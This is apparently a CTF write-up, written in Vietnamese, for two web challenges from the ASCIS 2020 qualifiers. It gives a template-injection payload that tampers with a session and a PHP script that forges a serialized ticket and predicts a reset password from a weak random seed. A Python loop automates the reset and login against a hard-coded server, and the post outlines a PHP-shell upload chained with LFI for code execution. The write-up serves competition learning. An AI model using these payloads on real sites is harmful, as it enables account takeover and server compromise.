---
title: "ASCIS 2020 Quals - Web"
date: 2020-01-08
tags: ["ctf", "web"]
layout: layouts/post.njk
---
## TSULOTT3
```
POST /

name={% set x=session.update({'check': 'access', 'jackpot': ''}) %}&ok=
```
```
POST /guess

jackpot=
```

## among_us
1. Viết PHP script để generate ra `ticket` và password mới cho user
```php
<?php
class CrewMate {
	public $name = 'tsu';
	public $secret_number = [1, 2, 3, 4, 5, 6, 7, 8, 9];
}

$arr = new CrewMate;
$se = serialize($arr);

echo base64_encode($se) . PHP_EOL;

$de = unserialize($se);
$secret_number = strtoupper($de->secret_number);
$random_rand = rand(0, $secret_number);
srand($random_rand);
$new_password = "";
while (strlen($new_password) < 30) {
    $new_password .= strval(rand());
}
echo 'New password: ' . $new_password . PHP_EOL;
?>
```
2. Viết Python script để tự động hóa việc lấy token để đăng nhập
```python
from re import findall
from hashlib import md5
import requests

REGEX_TOKEN = r'name="token" value="(.*?)"'
PHPSESSID = '' # Nhập PHPSESSID vào biến

while True:
    res = requests.get('http://35.240.156.48/?page=forgot', cookies={
        'PHPSESSID': PHPSESSID
    })
    token = findall(REGEX_TOKEN, res.text)[0]
    res = requests.post('http://35.240.156.48/?page=forgot', data={
        'ticket': 'Tzo4OiJDcmV3TWF0ZSI6Mjp7czo0OiJu[redacted]', # Ticket được lấy từ PHP script ở trên
        'token': token
    }, cookies={
        'PHPSESSID': PHPSESSID
    })

    res = requests.get('http://35.240.156.48/?page=login', cookies={
        'PHPSESSID': PHPSESSID
    })
    token = findall(REGEX_TOKEN, res.text)[0]
    res = requests.post('http://35.240.156.48/?page=login', data={
        'username': 'tsu',
        'password': '117856802212731241191535857466', # Password được lấy từ PHP script ở trên
        'token': token
    }, cookies={
        'PHPSESSID': PHPSESSID
    })
```
Chạy cho đến khi script bị lỗi tại hàm `findall` (vì login xong sẽ không còn form login nữa nên không thể lấy được token, dẫn đến lỗi).
3. Upload 1 PHP shell và server sẽ tạo 1 file zip chứa file mình mới upload lên và sẽ được xóa cho đến khi có 1 lượt upload khác.
4. Sử dụng lỗi LFI ở trang `index.php` + zip wrapper để include PHP shell trong file zip => RCE.
5. Lấy flag ở trong database.
